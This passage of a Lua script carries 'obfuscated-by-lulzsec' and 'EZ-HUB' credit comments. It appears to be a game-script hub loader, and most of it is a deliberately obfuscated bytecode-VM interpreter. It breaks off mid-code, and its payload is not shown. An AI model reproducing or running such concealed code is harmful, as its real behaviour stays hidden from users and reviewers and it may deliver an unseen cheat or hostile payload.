--obfuscated-by-lulzsec-
--API--SYSTEM--CREDITS-EZ-HUB


--
print("TEST1")


do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;while true do if (v0==3) then v10=setmetatable;v11=pcall;v12=select;v0=4;end if (5==v0) then function v15(v16,v17)local v18=1;local v19;v16=v5(v4(v16,5),"..",function(v30)if (v2(v30,2)==79) then v19=v1(v4(v30,1,1));return "";else local v62=v3(v1(v30,16));if v19 then local v71=v6(v62,v19);v19=nil;return v71;else return v62;end end end);local function v20(v31,v32,v33)if v33 then local v63=(v31/((3 -1)^(v32-((1 + 0) -0))))%((2 -0)^(((v33-(1 + 0)) -(v32-(1 + 0))) + ((2504 -(288 + 1059)) -(1014 + 142))));return v63-(v63%(2 -1));else local v64=0 -0;local v65;while true do if (v64==(396 -((192 -122) + 326))) then v65=(1 + 1)^(v32-1);return (((v31%(v65 + v65))>=v65) and 1) or ((0 -0) -0);end end end end local function v21()local v38=v2(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39,v40=v2(v16,v18,v18 + (2 -0));v18=v18 + 2 + 0;return (v40 * (211 + 45)) + v39;end local function v23()local v41=0 + 0 + 0;local v42;local v43;local v44;local v45;while true do if (v41==(1 + 0)) then return (v45 * (16777812 -(127 + 469))) + (v44 * ((67809 -(590 + 98)) -(316 + 1269))) + (v43 * (42 + 214)) + v42;end if (v41==(0 + 0)) then v42,v43,v44,v45=v2(v16,v18,v18 + 3 + 0);v18=v18 + (1047 -(95 + 948));v41=418 -((1301 -(430 + 608)) + 154);end end end local function v24()local v46=v23();local v47=v23();return (( -(5 -3) * v20(v47,17 + 15)) + (694 -(490 + 203))) * ((2 + 0)^(v20(v47,1126 -(124 + 981),31) -(484 + 539))) * ((((v20(v47,1 + 0,570 -(249 + 301)) * ((2 + 0)^32)) + v46)/((1 + 1)^((642 -(149 + 321)) -120))) + (2 -1));end local function v25(v34)local v48=205 -(196 + 9);local v49;local v50;while true do if (v48==3) then return v7(v50);end if (v48==1) then v49=v4(v16,v18,(v18 + v34) -(2 -1));v18=v18 + v34;v48=1726 -(973 + 191 + 560);end if (v48==((484 + 255) -(500 + 237))) then v50={};for v72=2 -1, #v49 do v50[v72]=v3(v2(v4(v49,v72,v72)));end v48=7 -4;end if ((0 + 0)==v48) then v49=nil;if  not v34 then local v86=0 + 0;while true do if (v86==(856 -((298 -145) + 703))) then v34=v23();if (v34==(1787 -(946 + 841))) then return "";end break;end end end v48=1 + 0;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0 + 0;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51~=(10 -7)) then else v58=nil;while true do if (v52~=(2 -1)) then else local v89=566 -(23 + 543);while true do if (v89==(2 + 0)) then v52=2 + 0;break;end if (v89~=1) then else for v103=459 -(347 + 111),v57 do local v104=0;local v105;local v106;local v107;local v108;while true do if (v104==2) then while true do if (v105==(1 -0)) then v108=nil;while true do if (v106==(0 + 0)) then local v171=0 -0;local v172;while true do if (v171==(0 -0)) then v172=0;while true do if ((0 + 0)==v172) then local v232=0;while true do if (v232==0) then v107=v21();v108=nil;v232=1 + 0;end if (v232~=1) then else v172=1;break;end end end if (v172==1) then v106=1 + 0;break;end end break;end end end if (v106~=1) then else if (v107==1) then v108=v21()~=0;elseif (v107==2) then v108=v24();elseif (v107==(3 + 0)) then v108=v25();end v58[v103]=v108;break;end end break;end if (v105~=(0 -0)) then else local v114=0;while true do if (v114==1) then v105=1;break;end if (v114~=0) then else v106=0;v107=nil;v114=1;end end end end break;end if (v104~=1) then else v107=nil;v108=nil;v104=1 + 1;end if (0~=v104) then else v105=0 + 0;v106=nil;v104=379 -(58 + 320);end end end v56[10 -7]=v21();v89=2;end if (v89~=0) then else v57=v23();v58={};v89=155 -(31 + 123);end end end if (v52==(1887 -(1826 + 61))) then local v90=0;while true do if (v90==(1122 -(923 + 197))) then v52=1 + 0;break;end if (v90==(3 -2)) then v55={};v56={v53,v54,nil,v55};v90=2 + 0;end if (v90==0) then v53={};v54={};v90=1 -0;end end end if (v52==2) then for v91=1,v23() do local v92=0;local v93;local v94;while true do if (v92==(1 -0)) then while true do if (v93~=0) then else v94=v21();if (v20(v94,1,1 + 0)==(1203 -(595 + 608))) then local v109=0;local v110;local v111;local v112;local v113;while true do if (v109==(611 -(387 + 222))) then while true do if (v110==1) then local v197=0;while true do if (v197~=(1493 -(987 + 505))) then else v110=2;break;end if (v197==(1874 -(1830 + 44))) then v113={v22(),v22(),nil,nil};if (v111==0) then local v242=0;local v243;local v244;local v245;while true do if (0~=v242) then else v243=0;v244=nil;v242=1;end if (v242==1) then v245=nil;while true do if (v243~=(0 + 0)) then else v244=560 -(240 + 320);v245=nil;v243=435 -(300 + 134);end if (v243~=(2 -1)) then else while true do if (v244==0) then v245=576 -(200 + 376);while true do if (v245~=0) then else v113[1122 -(714 + 405)]=v22();v113[914 -(18 + 892)]=v22();break;end end break;end end break;end end break;end end elseif (v111==1) then v113[3]=v23();elseif (v111==2) then v113[702 -(154 + 545)]=v23() -((483 -(233 + 248))^16);elseif (v111~=(5 -2)) then else local v268=0;local v269;while true do if (v268==(0 + 0)) then v269=0 -0;while true do if (v269==0) then v113[3]=v23() -((1 + 1)^(1614 -(1357 + 241)));v113[143 -(126 + 13)]=v22();break;end end break;end end end v197=1;end end end if (3~=v110) then else if (v20(v112,1532 -(601 + 928),1949 -(963 + 983))~=1) then else v113[4]=v58[v113[18 -14]];end v53[v91]=v113;break;end if (v110==2) then local v199=0;while true do if (v199==(0 + 0)) then local v219=0;local v220;while true do if (v219==(0 + 0)) then v220=0;while true do if ((464 -(272 + 191))~=v220) then else v199=1647 -(1397 + 249);break;end if (v220~=0) then else local v259=0;while true do if (v259~=0) then else if (v20(v112,1 + 0,1 + 0)~=(1796 -(496 + 1299))) then else v113[2]=v58[v113[1 + 1]];end if (v20(v112,5 -3,2)~=(1 -0)) then else v113[9 -6]=v58[v113[3]];end v259=1;end if (v259~=1) then else v220=1;break;end end end end break;end end end if (v199==(1938 -(1290 + 647))) then v110=3;break;end end end if (v110==(0 + 0)) then local v200=0 + 0;local v201;while true do if (v200~=0) then else v201=0;while true do if (v201~=0) then else local v246=0 + 0;while true do if (v246==(138 -(29 + 108))) then v201=1;break;end if (v246==(981 -(577 + 404))) then v111=v20(v94,2 + 0,1039 -(679 + 357));v112=v20(v94,4,11 -5);v246=2 -1;end end end if (v201==(1 -0)) then v110=1;break;end end break;end end end end break;end if (v109~=(1 + 0)) then else local v115=1188 -(110 + 1078);while true do if (v115==1) then v109=178 -(174 + 2);break;end if (v115==0) then v112=nil;v113=nil;v115=1 + 0;end end end if (v109==0) then local v116=0 -0;while true do if (v116~=(1 + 0)) then else v109=1;break;end if ((0 -0)==v116) then v110=0 + 0;v111=nil;v116=1 + 0;end end end end end break;end end break;end if ((0 -0)==v92) then v93=0;v94=nil;v92=4 -3;end end end for v95=1 + 0,v23() do v54[v95-(1 -0)]=v28();end for v97=2 -1,v23() do v55[v97]=v23();end return v56;end end break;end if ((2 + 0)~=v51) then else v56=nil;v57=nil;v51=3;end if (v51~=0) then else v52=1545 -(931 + 614);v53=nil;v51=1;end if (1~=v51) then else v54=nil;v55=nil;v51=4 -2;end end end local function v29(v35,v36,v37)local v59=v35[1];local v60=v35[2];local v61=v35[3];return function(...)local v66=1;local v67= -1;local v68={...};local v69=v12("#",...) -1;local function v70()local v74=v59;local v75=Const;local v76=v60;local v77=v61;local v78=v27;local v79={};local v80={};local v81={};for v87=1846 -(1767 + (282 -(165 + 38))),v69 do if ((v87>=v77) or ((1061 + 3288)<=(1467 -((1501 -1150) + 3)))) then v79[v87-v77]=v68[v87 + (2 -1)];else v81[v87]=v68[v87 + (2 -1)];end end local v82=(v69-v77) + (913 -(653 + 259));local v83;local v84;while true do local v88=0 + 0;while true do if ((2881<(3038 + 691)) and (v88==(0 + (0 -0)))) then local v101=832 -(704 + 128);while true do if ((v101==0) or ((575 + 42)>=(7425 -4089))) then v83=v74[v66];v84=v83[2 -1];v101=1586 -(1115 + 470);end if ((1410<=(4679 -(337 + 317))) and (v101==((3 -1) -1))) then v88=1 + (0 -0);break;end end end if (((549 + 3133 + 454)==4136) and (v88==(1 + 0))) then if ((v84<=((739 -(472 + 173)) -75)) or ((7440 -3133)<=(1892 -(1241 + 309)))) then if ((v84<=(12 -3)) or ((2092 -(643 + 1075))>=3116)) then if ((v84<=(4 + 0)) or ((313 -136)>(4481 -(119 + 795)))) then if ((v84<=((1661 -(168 + 269)) -(174 + 1049))) or ((3883 + 1115)<=(4388 -3109))) then if ((v84==0) or (((13981 -7691) -(181 + 1684))<=(760 + 2155))) then v81[v83[(2 + 4) -4]]=v83[1 + 1 + 1];else do return;end end elseif (((10507 -6505)>=2635) and (v84<=(5 -3))) then do return v81[v83[2]];end elseif ((v84>(995 -(228 + 764))) or ((599 -313)>745)) then local v174=0;local v175;while true do if (((4213 -(28 + (1223 -839)))<=4573) and (v174==(1383 -(955 + 428)))) then v175=v83[3 -1];do return v13(v81,v175,v67);end break;end end else local v176=0;local v177;local v178;local v179;while true do if ((v176==(1 -0)) or ((5569 -(300 + (962 -483)))==1160)) then v179=0 + 0;for v221=v177,v83[15 -11] do local v222=206 -(164 + 42);local v223;local v224;while true do if ((v222==(0 + 0)) or ((60 + 404)>1206)) then v223=0 -0;v224=nil;v222=1 + 0;end if (((3155 + 134)>=(3285 -(707 + 862))) and (v222==(2 -1))) then while true do if (((0 + 0)==v223) or ((3283 + 342)<(4318 -(1573 + 326)))) then v224=(4573 -2626) -((5175 -3658) + 430);while true do if ((3416<=(5724 -2016)) and (v224==(0 -(0 -0)))) then v179=v179 + 1 + 0;v81[v221]=v178[v179];break;end end break;end end break;end end end break;end if (((2930 + 1242)>=((1330 + 2707) -(1218 + 78 + 24))) and (v176==(0 -(202 -(169 + 33))))) then v177=v83[(62 + 89) -(56 + 93)];v178={v81[v177](v13(v81,v177 + 1,v67))};v176=3 -2;end end end elseif (((1070 + 576)<((1989 -(899 + 650)) + 2070)) and (v84<=(976 -(350 + 620)))) then if ((v84>5) or ((6138 -(645 + 845))<(4697 -(408 + 279)))) then local v118=1462 -(989 + 473);local v119;local v120;local v121;local v122;local v123;while true do if ((((4 + 0) -(2 + 1))==v118) or ((428 + 3100)<1677)) then local v202=0 + 0;while true do if ((v202==((3091 -(324 + 936)) -(733 + 1097))) or ((1514 -885)>=(999 + 1960))) then v118=4 -2;break;end if ((v202==(0 -(0 -0))) or ((874 -(338 + 466))>3431)) then v121=v119 + (2 -0);v122={v81[v119](v81[v119 + (1353 -((584 -(134 + 129)) + 183 + 848))],v81[v121])};v202=1 -0;end end end if (((5256 -1362)>=(181 + 3114)) and (v118==0)) then v119=v83[1520 -(664 + 854)];v120=v83[4 + 0];v118=2 -1;end if (((2894 + 571)>=(598 -(97 + 75))) and ((897 -(590 + 304))==v118)) then if (v123 or ((1315 -(718 + 262))>((4039 -1489) -(1148 + 664)))) then local v215=(1131 -(857 + 274)) -0;local v216;local v217;while true do if ((v215==(4 -3)) or ((1509 -964)>=3505)) then while true do if ((v216==0) or ((15622 -10829)<=(4947 -((129 -(30 + 54)) + 242)))) then v217=0;while true do if (((551 + (1857 -658))<(4499 -2436)) and ((1040 -(1037 + 3))==v217)) then v81[v121]=v123;v66=v83[1 + 2];break;end end break;end end break;end if (((2372 + 1217)>=(2032 -(60 + 908))) and ((0 -0)==v215)) then v216=0;v217=nil;v215=1;end end else v66=v66 + 1 + 0;end break;end if ((v118==2) or ((4523 -(669 + 1087))==(5151 -(119 + 67)))) then local v203=0 -0;while true do if (((1434 -(1245 + 189))==v203) or ((5066 -((7190 -5435) + (352 -(286 + 38))))<=(957 + 304))) then for v233=1,v120 do v81[v121 + v233]=v122[v233];end v123=v122[1 + 0];v203=2 -1;end if ((v203==1) or ((4242 -1713)>(3239 + 927))) then v118=4 -1;break;end end end end else v81[v83[469 -(63 + 404)]]=v81[v83[68 -(35 + 30)]][v83[1989 -(7 + (7688 -5710))]];end elseif (((10896 -7899)>=(2477 + 179)) and (v84<=(29 -22))) then v81[v83[1568 -(1533 + 33)]]=v83[3]~=(0 + 0);elseif ((v84>8) or ((2892 -((3699 -(341 + 1643)) + 57))>=3225)) then for v204=v83[1 + 0 + (117 -(22 + 94))],v83[3] do v81[v204]=nil;end else local v180=(1238 -(768 + 470)) + 0;local v181;while true do if (((10019 -6334)<=(1821 + 2065)) and (0==v180)) then v181=v83[(1 + 1) -(1055 -(732 + 323))];v81[v181]=v81[v181]();break;end end end elseif ((v84<=(2 + 12)) or ((639 + 1046)>(8144 -5202))) then if ((v84<=(1702 -(416 + 1275))) or ((11 + 502)==(3469 -(14 + 105)))) then if (((4492 -2938)<(2269 + 2039)) and (v84>(1798 -(882 + 906)))) then v81[v83[947 -(168 + 777)]]=v29(v76[v83[3 + 0]],nil,v37);elseif (((1541 + 192)>(316 + 177)) and  not v81[v83[1957 -((525 -167) + 1597)]]) then v66=v66 + (907 -(70 + 836));else v66=v83[3];end elseif ((v84<=(17 -5)) or ((4450 -(215 + 352))>(6009 -(1434 + 435)))) then local v127=0 -0;local v128;local v129;local v130;local v131;local v132;while true do if (((204 + 1025)<(7094 -2103)) and (v127==(2 + 0))) then v132=nil;while true do if (((1638 -(634 + 1004))==v128) or (((4395 -(8 + 158)) -2582)>4563)) then local v225=1569 -(1564 + 5);while true do if (((933 -529)<=(6274 -3140)) and (v225==(1 + 0 + 0))) then v128=1 + 0 + 0;break;end if (((3581 -(448 + (1786 -(560 + 966))))>2668) and (v225==0)) then v129=0;v130=nil;v225=(1 + 0) -0;end end end if ((3981>=(4746 -2386)) and (v128==(1 + 0))) then v131=nil;v132=nil;v128=2;end if (((433 + 790)<=((1459 -(142 + 44)) -(13 + 21))) and (v128==(751 -(168 + 581)))) then while true do if ((4497==(843 + 3654)) and (v129==(0 -0))) then local v247=0 -0;while true do if ((v247==(1295 -(462 + 833))) or ((3329 + 1127)<3884)) then local v260=0 + 0;while true do if (((4760 -(1051 + 10))>(1113 + 1501)) and (v260==((1580 -(1460 + 119)) + 0))) then v247=1;break;end if (((8780 -4988)>((2577 -(566 + 83)) + 1122)) and (v260==(0 -0))) then v130=v76[v83[5 -2]];v131=nil;v260=1;end end end if (((6745 -(1218 + 737))<(10866 -5993)) and (v247==(147 -(52 + 94)))) then v129=1;break;end end end if (((2427 -(201 + 447))<(5317 -(752 + 468))) and (v129==1)) then local v248=0;while true do if ((v248==(4 -3)) or ((2117 -942)>(4990 -(1641 + 7)))) then v129=1658 -(1338 + 318);break;end if ((v248==(1261 -(643 + (986 -(82 + 286))))) or ((4584 -(1102 + 616))<(4746 -2270))) then v132={};v131=v10({},{__index=function(v262,v263)local v271=1823 -(707 + 1116);local v272;local v273;local v274;while true do if (((2556 -(20 + 474))<(4811 -(153 + 11))) and (v271==0)) then v272=568 -(86 + 482);v273=nil;v271=1 + 0;end if (((1063 + 569)>=(2814 -((1467 -(423 + 100)) + 510))) and ((3 -2)==v271)) then v274=nil;while true do if (((1915 + 254)<(1881 + 2590)) and (v272==(0 + 0))) then local v294=(0 -0) -0;while true do if ((v294==(0 -0)) or (541<205)) then v273=1234 -(1169 + 4 + 61);v274=nil;v294=1 + 0;end if ((v294==(1 + 0)) or (1660>(5557 -(1169 + 633)))) then v272=1 + 0;break;end end end if (((8450 -(3840 + 529))>2814) and ((1738 -(1187 + 550))==v272)) then while true do if ((v273==(1887 -(442 + (2206 -761)))) or ((11123 -6749)==(1832 + 2682))) then local v302=(0 -0) + 0;while true do if (((431 -(341 + 90))==v302) or (3906==(571 + 22 + 6))) then local v303=0 + (0 -0);while true do if ((2984==(3289 -(144 + (1602 -(656 + 785))))) and (v303==(0 -(0 -0)))) then v274=v132[v263];return v274[1 + 0][v274[5 -3]];end end end end end end break;end end break;end end end,__newindex=function(v264,v265,v266)local v275=(2380 -951) -(432 + (2022 -(428 + 597)));local v276;local v277;while true do if (((802 -(253 + 548))==v275) or (3794==1192)) then while true do if ((v276==(0 + 0)) or ((4645 + 97)<=(4542 -(204 + (3558 -2069))))) then v277=v132[v265];v277[1][v277[1234 -(34 + 63 + 1135)]]=v266;break;end end break;end if ((3692==(13273 -9581)) and (0==v275)) then v276=0 -0;v277=nil;v275=1;end end end});v248=1634 -(764 + 869);end end end if (((9098 -6444)>=1301) and (((2468 -(553 + 580)) -(331 + 1002))==v129)) then for v252=875 -(532 + (363 -(20 + 1))),v83[1 + 3] do local v253=0 + 0;local v254;local v255;local v256;while true do if ((v253==(0 + 0)) or (1329>=4398)) then v254=276 -((606 -344) + 14);v255=nil;v253=1 -0;end if ((v253==(1 + 0 + 0)) or ((4863 -(55 + 156))<4276)) then v256=nil;while true do if ((v254==(1898 -(106 + 1792))) or ((5967 -4258)>(6853 -3560))) then local v285=0;while true do if (((265 + 2082)<(11786 -(8255 -(912 + 22)))) and (0==v285)) then v255=112 -(84 + (40 -12));v256=nil;v285=1671 -((2269 -(426 + 871)) + 698);end if (((1276 + 3710)>=(6499 -(1488 + 53))) and (v285==(986 -(925 + 60)))) then v254=1;break;end end end if ((((2876 -(337 + 445)) + 46)<=2282) and (v254==(1855 -((8864 -7083) + (198 -125))))) then while true do if (((7048 -4542)==(3478 -(919 + 53))) and (v255==(89 -(47 + 42)))) then local v288=0 + 0;while true do if ((4534>(4647 -(2335 + 673))) and (v288==1)) then v255=2 -1;break;end if (((1032 -(861 + 171))==v288) or (726>=(1744 -(160 + 308)))) then local v299=0 + 0;while true do if (((5322 -(650 + 217))==(8724 -4269)) and (v299==(2 -1))) then v288=1 + 0;break;end if ((v299==(126 -(69 + 57))) or ((1124 + 1119)==(816 + 707))) then v66=v66 + (2 -1);v256=v74[v66];v299=1;end end end end end if ((((1239 -950) + 315)<=(4080 -(733 + 306))) and ((2 -1)==v255)) then if ((v256[1 -0]==(1202 -((305 -194) + 1068))) or ((2888 + 1940)<=(113 + 2176))) then v132[v252-(3 -2)]={v81,v256[1718 -(1292 + 423)]};else v132[v252-(1943 -((578 -(44 + 12)) + 1420))]={v36,v256[3 + 0]};end v80[ #v80 + 1 + 0]=v132;break;end end break;end end break;end end end v81[v83[2]]=v29(v130,v131,v37);break;end end break;end end break;end if (((0 -0)==v127) or ((2122 -(470 + 84))==(1336 + 155))) then v128=551 -(248 + 303);v129=nil;v127=(1583 -(804 + 778)) -0;end if (((5592 -3584)>346) and (v127==(770 -(370 + 399)))) then v130=nil;v131=nil;v127=1 + 1;end end elseif ((v84>(10 + 3)) or (3213<=(3753 -(142 + 135 + 873)))) then v81[v83[2]][v83[9 -6]]=v83[5 -(2 -1)];else local v183=0;local v184;while true do if (((5785 -(231 + 1337))==(4233 -(6 + 10))) and (v183==(0 + 0))) then v184=v83[2 + 0];do return v81[v184](v13(v81,v184 + 1 + 0,v83[256 -(75 + 178)]));end break;end end end elseif ((v84<=(58 -42)) or (1889>=2229)) then if ((v84>15) or (((2001 + 913) -1713)<(655 + 191))) then local v133=0 + 0;local v134;local v135;local v136;local v137;while true do if ((v133==(2 -1)) or (4277<(3081 -1955))) then v67=(v136 + v134) -(917 -(543 + 373));v137=0;v133=1 + 1;end if (((1493 -550)<=4088) and (v133==(1 + 1))) then for v209=v134,v67 do local v210=122 -(7 + 115);local v211;while true do if ((4592>(3495 -(315 + 61))) and (v210==0)) then v211=0 -0;while true do if ((4636>=(4921 -(192 + 1655))) and ((1459 -(72 + 1387))==v211)) then v137=v137 + (1162 -(345 + 816));v81[v209]=v135[v137];break;end end break;end end end break;end if ((v133==(1148 -((1544 -474) + 78))) or ((1568 + 1066)<=1555)) then local v206=1801 -(1328 + 473);while true do if (((6103 -(69 + 1070))>(836 + 1252)) and (1==v206)) then v133=1360 -(212 + (2294 -(241 + 906)));break;end if ((v206==((1210 -(127 + 131)) -(763 + 189))) or (2783==(5019 -3208))) then v134=v83[2];v135,v136=v78(v81[v134](v13(v81,v134 + 1 + 0,v83[997 -(796 + 198)])));v206=1 + 0;end end end end else v81[v83[2 + 0]]=v37[v83[3 + 0]];end elseif ((757<=(506 + 1337)) and (v84<=17)) then local v139=1121 -((2082 -(754 + 486)) + 279);local v140;local v141;while true do if (((1993 + 1933)>=(131 + 3184)) and (v139==0)) then v140=0;v141=nil;v139=1 + 0;end if ((v139==(2 -1)) or (419==(2006 -(254 + (2844 -(106 + 1063)))))) then while true do if (((1679 -(965 + 714))==v140) or ((830 + 10)>(6800 -2072))) then v141=v83[555 -(211 + 342)];v81[v141]=v81[v141](v81[v141 + (1676 -(362 + 1313))]);break;end end break;end end elseif ((1068<=(4836 -(449 + 889))) and (v84==18)) then local v185=0 -0;local v186;local v187;local v188;while true do if ((v185==0) or ((12702 -9420)<(151 + 368))) then v186=0 -0;v187=nil;v185=1 + 0;end if ((v185==(2 -1)) or ((499 + 3405)==(664 + 212))) then v188=nil;while true do if (((4806 -1979)<=((508 + 6301) -3631)) and (v186==(1138 -(192 + 945)))) then while true do if ((690>(1088 -(57 + 482))) and ((512 -((1445 -(310 + 844)) + 221))==v187)) then v188=v83[1 + 1];v81[v188](v81[v188 + 1]);break;end end break;end if ((v186==((625 -(442 + 183)) + 0)) or ((1164 + 991)<(6 + 31))) then v187=1345 -(308 + 841 + 196);v188=nil;v186=1 + 0;end end break;end end elseif (((5986 -(846 + 445))>(2604 -(344 + 565))) and (v83[2]==v81[v83[14 -10]])) then v66=v66 + (1613 -(421 + 1191));else v66=v83[(2270 -1108) -((2579 -1831) + 411)];end elseif (((3473 -(1177 + 475))>((1814 -1335) + (722 -(39 + 19)))) and (v84<=29)) then if (((172 + 1502 + 1040)<=2889) and (v84<=(5 + 19))) then if (((2039 -1251)<(4067 -(409 + 1489))) and (v84<=(44 -23))) then if ((v84>20) or ((245 + (1116 -(28 + 421)))==(2955 -1548))) then local v142=1844 -((1435 -(734 + 185)) + 1328);local v143;local v144;local v145;while true do if ((230<(1988 -(73 + 105))) and (v142==(1047 -(773 + 273)))) then v145=nil;while true do if (((4584 -(4431 -1546))==1699) and (v143==((946 -(43 + 902)) + 0))) then v81[v144 + (1996 -(1951 + 44))]=v145;v81[v144]=v145[v83[149 -(38 + 107)]];break;end if ((((6417 -(778 + 536)) -(140 + 540))==(6416 -((1882 -(87 + 90)) + 288))) and (v143==0)) then local v229=(2419 -(1511 + 478)) -(369 + (1361 -(214 + 1086)));local v230;while true do if ((v229==(0 -(0 + 0))) or (828>=(3784 -1887))) then v230=0;while true do if ((v230==(1264 -(898 + 280 + 86))) or ((257 + 437)==(3501 + 975))) then local v261=0;while true do if (((4248 -(452 + 779))>=(2333 -(589 + 393))) and (v261==(2 -1))) then v230=1 + 0;break;end if ((v261==(71 -(4 + 67))) or (2714<(3279 -1420))) then v144=v83[2 + 0];v145=v81[v83[3]];v261=1 -0;end end end if (((3464 -2276)==1188) and (v230==(2 -1))) then v143=1 + 0;break;end end break;end end end end break;end if ((v142==(0 -0)) or (((557 + 4939) -(184 + 618))<=933)) then local v207=17 -(8 + 9);while true do if (((1834 + 776)>(3869 -2775)) and (v207==0)) then v143=218 -(207 + 11);v144=nil;v207=1060 -(97 + 962);end if (((2835 -1757)>(326 -134)) and (v207==(1291 -(1042 + 248)))) then v142=1 + 0;break;end end end end else v37[v83[3]]=v81[v83[1 + 1]];end elseif (((16914 -12576)>=(321 -165)) and (v84<=(59 -(1639 -(489 + 1113))))) then local v147=0 + 0;local v148;local v149;local v150;local v151;while true do if (((2548 + 2047)<=4735) and (v147==(1 + (0 -0)))) then local v208=480 -(346 + 134);while true do if (((0 -0)==v208) or ((154 + 216)>=935)) then v67=(v150 + v148) -(2 -(1 + 0));v151=(1848 -(395 + 392)) -(483 + (1716 -(98 + 1040)));v208=650 -(57 + 592);end if (((4452 -2820)<=(3527 + 889)) and (v208==(1607 -(426 + 1180)))) then v147=2 -0;break;end end end if (((8114 -(12037 -6176))<(3415 -(150 + 140))) and (v147==(2 -0))) then for v212=v148,v67 do local v213=700 -(42 + 658);while true do if (((2893 + 74)>=(3116 -(519 + 1015))) and (v213==((1770 -(742 + 948)) -(19 + 61)))) then v151=v151 + (1 -0);v81[v212]=v149[v151];break;end end end break;end if ((3134<=3529) and (v147==(0 + 0))) then v148=v83[2];v149,v150=v78(v81[v148](v81[v148 + (601 -(476 + 124))]));v147=1842 -(1657 + 184);end end elseif (((1516 -(69 + 16 + 1))<(8104 -5155)) and (v84>(8 + 15))) then v81[v83[1387 -(943 + 442)]]();else v81[v83[7 -5]]=v81[v83[5 -2]];end elseif ((v84<=26) or ((368 + 222)>862)) then if ((v84>(1272 -(1054 + 193))) or (1003==((187 + 190) -((23 -14) + 87)))) then v66=v83[1746 -(772 + (2516 -1545))];elseif ((v81[v83[2]]~=v83[9 -(1670 -(581 + 1084))]) or (502==3968)) then v66=v66 + 1 + 0;else v66=v83[784 -(752 + 29)];end elseif (((3006 -(3330 -(281 + 871)))<=2719) and (v84<=(8 + 13 + 6))) then local v152=0;local v153;local v154;local v155;while true do if ((v152==(1814 -(444 + 1369))) or ((16165 -12019)<(1353 -((910 -311) + 367)))) then v155=nil;while true do if ((4394==(14600 -(8620 + 1586))) and (v153==(1 + 0))) then for v236=1, #v80 do local v237=0;local v238;local v239;while true do if (((5333 -1759)>=2541) and (v237==(647 -(44 + 602)))) then while true do if (((5269 -((1111 -(274 + 729)) + 684))>(1765 + 50)) and (v238==(1951 -(139 + 108 + 1704)))) then v239=v80[v236];for v278=817 -(344 + 473), #v239 do local v279=0 -0;local v280;local v281;local v282;local v283;while true do if (((4494 -((53 -23) + 38))==(17782 -13356)) and ((1 -0)==v279)) then v282=nil;v283=nil;v279=2 + 0 + 0;end if (((2577 + 755)>=(3665 -(537 + 279))) and (v279==0)) then v280=0 -0;v281=nil;v279=1 + 0;end if (((602 + 1079)>=622) and (v279==(5 -3))) then while true do if ((v280==(1 + 0)) or (3946<(207 + 1232))) then v283=v281[6 -4];if (((2067 -830)==(276 + 961)) and (v282==v81) and (v283>=v154)) then local v300=0 -0;local v301;while true do if (((0 -0)==v300) or (2053==(908 -(462 + 134)))) then v301=0 + 0;while true do if ((v301==(701 -(74 + 627))) or ((2182 + 528)<=980)) then v155[v283]=v282[v283];v281[494 -(220 + 273)]=v155;break;end end break;end end end break;end if ((710==(123 + 587)) and (v280==(328 -(89 + 239)))) then local v296=(165 -90) -(73 + 2);while true do if (((177 + 1568)==(1778 -(27 + 6))) and (v296==((2162 -1717) -(95 + 349)))) then v280=1;break;end if ((4819>=(2566 -1585)) and (v296==(0 -0))) then v281=v239[v278];v282=v281[1];v296=(453 -(118 + 334)) + 0;end end end end break;end end end break;end end break;end if ((v237==((495 -(366 + 129)) -0)) or ((3239 -(311 + 66))>(3259 + 64 + 186))) then v238=0 -0;v239=nil;v237=2 -1;end end end break;end if ((v153==(0 + 0)) or ((13019 -9082)==4560)) then v154=v83[3 -1];v155={};v153=(3 -2) + 0;end end break;end if ((3763<=((7812 -(1240 + 217)) -(1845 + 39))) and (v152==(0 + (0 -0)))) then v153=917 -(430 + 487);v154=nil;v152=259 -(85 + 173);end end elseif (((8383 -(4512 + 837))>=(80 + 1755)) and (v84>28)) then if ((v81[v83[(3851 -2976) -(38 + 835)]]==v83[3 + 1]) or ((5046 -((1041 -(115 + 544)) + (4 -3)))<(4565 -(358 + 738)))) then v66=v66 + (1 -0);else v66=v83[3 + 0];end else local v190=0 + 0;local v191;local v192;while true do if ((v190==(0 -0)) or ((16481 -(12772 -(367 + 125)))<=(12752 -9635))) then v191=0 + 0;v192=nil;v190=1 + 0;end if (((1255 + 1751)>1125) and (v190==1)) then while true do if (((5406 -(869 + 550))==(4476 -(396 + 93))) and (v191==(0 -0))) then v192=v83[1 + 1];do return v13(v81,v192,v192 + v83[3 -0]);end break;end end break;end end end elseif ((v84<=(49 -15)) or (3406==(3 + 87))) then if ((v84<=((1419 -(692 + 621)) -75)) or ((4985 -(1100 + 57))>=(1528 + 462 + 941 + 1980))) then if ((v84==30) or ((4049 -(102 + 259))==(2940 -(100 + 574)))) then local v156=0 + 0;local v157;local v158;while true do if ((v156==(0 -0)) or ((4484 -1668)>=(5239 -2415))) then v157=(445 -(142 + 303)) -0;v158=nil;v156=(2 -1) + 0;end if ((v156==(2 -1)) or ((4368 -(488 + 186))<=1203)) then while true do if (((1472 + 645)==2117) and (v157==(0 -0))) then v158=v83[2];v81[v158](v13(v81,v158 + 1 + 0,v67));break;end end break;end end else v81[v83[1668 -(403 + 1263)]]=v36[v83[3]];end elseif (((4426 -(1189 + 563))<=(4316 -(175 + 99))) and (v84<=(120 -88))) then local v160=1447 -(675 + 772);local v161;local v162;local v163;while true do if (((5259 -(581 + 132 + 149))>(599 -236)) and (v160==(2 -1))) then v163=nil;while true do if (((2178 -1586)==(357 + 235)) and (v161==(1359 -(879 + 480)))) then v162=0;v163=nil;v161=1 + 0;end if (((816 -370)<=(7354 -(12812 -7190))) and (v161==(992 -(921 + 70)))) then while true do if ((377<(2963 -(1014 + 460))) and (v162==(0 + 0))) then v163=v83[4 -2];v81[v163]=v81[v163](v13(v81,v163 + 1 + 0,v67));break;end end break;end end break;end if ((2790>=(6342 -4717)) and (v160==((0 + 0) -(0 + 0)))) then v161=0;v162=nil;v160=1 -0;end end elseif ((v84==(58 -25)) or ((393 + 74 + 340)>4580)) then v81[v83[2 + 0]]={};else local v194=0;local v195;while true do if (((4676 -(26 + 218))==(11981 -7549)) and (v194==(429 -(258 + 171)))) then v195=v81[v83[1881 -(1186 + 691)]];if ( not v195 or (((4455 -(466 + 850)) -(18 + 511 + 65))<=340)) then InstrPoint=InstrPoint + 1;else local v240=0;local v241;while true do if ((v240==(0 